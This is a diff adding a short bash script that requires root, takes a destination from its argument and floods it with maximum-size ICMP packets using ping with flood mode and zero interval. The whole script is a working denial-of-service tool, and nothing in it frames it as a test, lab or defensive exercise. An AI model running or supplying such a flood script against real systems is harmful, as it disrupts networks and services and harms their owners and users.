@@ -1,0 +1,14 @@
+#! /bin/bash
+
+if [ $(id -u) != "0" ]; then
+  echo "Must be root!";
+  exit 2;
+fi
+
+if [ "$1" == "" ]; then
+  echo "Destination needed!";
+  exit 2;
+fi
+
+echo "Flooding $1 ...";
+ping -f -i 0 -s 65500 $1;
